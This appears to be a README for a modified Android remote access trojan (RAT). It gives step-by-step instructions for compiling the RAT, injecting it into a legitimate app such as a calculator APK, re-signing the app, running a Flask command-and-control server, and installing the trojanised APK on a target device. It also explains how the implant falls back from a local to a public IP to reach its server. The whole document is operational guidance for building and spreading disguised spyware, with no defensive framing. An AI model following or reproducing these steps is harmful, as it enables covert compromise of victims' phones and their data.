# Instructions for Using the Modified RAT

This document provides step-by-step instructions for using the modified RAT with dual IP configuration.

## Overview

The RAT has been modified to work with both local and public IP addresses, allowing it to function in both local network and over the internet. The key modifications are:

1. The RAT now reads both LOCAL_IP and PUBLIC_IP from the config.ini file
2. It first tries to connect using the local IP, and if that fails, it switches to the public IP
3. The server automatically detects and uses the local IP address of the machine it's running on

## Step 1: Compile the Java Code

```bash
./compile.sh
```

This will:
- Compile the Java source files
- Create a JAR file
- Convert the JAR to DEX
- Generate the Smali files

## Step 2: Bind an APK

```bash
./bind_apk.sh calculator.apk
```

This will:
- Decode the APK
- Inject the RAT code
- Create a config.ini file with both local and public IP addresses
- Rebuild and sign the APK

When prompted, enter your public IP address. If you don't have a public IP or are just testing locally, you can press Enter to use the local IP for both.

## Step 3: Run the Server

```bash
./run_server.sh
```

This will:
- Install the required Python packages
- Start the Flask server on port 12000
- Display the server URLs

## Step 4: Install the APK on the Target Device

Install the modified APK on your Android device. The RAT will automatically connect to the server using either the local or public IP address, depending on which one is reachable.

## Troubleshooting

If the RAT is not connecting:

1. Make sure the server is running
2. Check that the IP addresses in the config.ini file are correct
3. Ensure that the ports are open and accessible
4. Check the device logs for any errors

## Technical Details

### Configuration File

The configuration is stored in the `assets/config.ini` file in the APK, which contains:

```ini
LOCAL_IP=192.168.1.100  # Your local IP address
PUBLIC_IP=your.public.ip  # Your public IP address
FLASK_PORT=12000  # Port for Flask API calls
RAT_PORT=12000  # Port for RAT connections
```

### Connection Logic

The RAT first tries to connect using the local IP address. If that fails (after a 5-second timeout), it automatically switches to the public IP address.

### Server Configuration

The server runs on port 12000 and is accessible both locally and over the internet. The web interface is available at `http://<your-ip>:12000`, and the RAT devices connect to `http://<your-ip>:12000/api/rat_connect`.